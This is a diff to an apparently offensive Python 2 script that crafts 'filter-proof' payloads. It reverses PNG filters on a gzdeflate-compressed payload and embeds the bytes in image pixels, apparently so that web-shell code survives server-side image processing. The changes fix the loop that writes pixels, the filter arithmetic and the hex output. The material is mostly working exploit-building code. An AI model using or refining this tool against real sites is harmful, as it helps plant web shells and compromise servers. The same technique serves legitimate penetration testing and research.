@@ -141,7 +141,7 @@ def filterBypass(gzdeflatePayload):
 		bList.append(i)
 	#duplicate
 	bList2=bList
-
+	
 	#reverse filter 1
 	i=0
 	while i < (len(bList)-3):
@@ -149,17 +149,21 @@ def filterBypass(gzdeflatePayload):
 		i+=1
 	for filter1 in bList:
 		payload.append(filter1)
-
+	print payload
+	
 	#reverse filter 3
 	i = 0
 	while i < (len(bList2)-3):
-		bList2[i+3] = (bList2[i+3] + floor(bList2[i] / 2)) % 256
-		i += 1
+		bList2[i+3] = (bList2[i+3] + int(bList2[i] / 2)) % 256
+		i+=1
 	for filter3 in bList2:
-		payload.append(int(filter3))
+		payload.append(filter3)
+	print payload
+
 
 	print "[+]Filter-Proof Payload Crafted!"
-	print "Filter-Proof Payload: %s" % ''.join([(hex(i)) for i in payload]).replace('0x','')
+	print "Filter-Proof Payload Size: %s" % len(payload)
+	print "Filter-Proof Payload: %s" % ''.join([(hex(i)[2:].zfill(2)) for i in payload])
 	return payload
 
 def generateFinalPayload(payload, outputImage):
@@ -168,13 +172,16 @@ def generateFinalPayload(payload, outputImage):
 	im = Image.new('RGB', (32,32))
 	i = 0
 	c = 0
-	if i >= len(payload):
-		r = payload[i]
-		g = payload[i+1]
-		b = payload[i+2]
-		im.putpixel((c,0), (r,g,b))
-		i += 3
-		c += 1
+	while (i < len(payload)):
+		try:
+			r = payload[i]
+			g = payload[i+1]
+			b = payload[i+2]
+			im.putpixel((c,0), (r,g,b))
+			i += 3
+			c += 1
+		except:
+			payload.append(255)
 
 	im.save(outputImage)
 	print "[!!] COMPLETE [!!]"
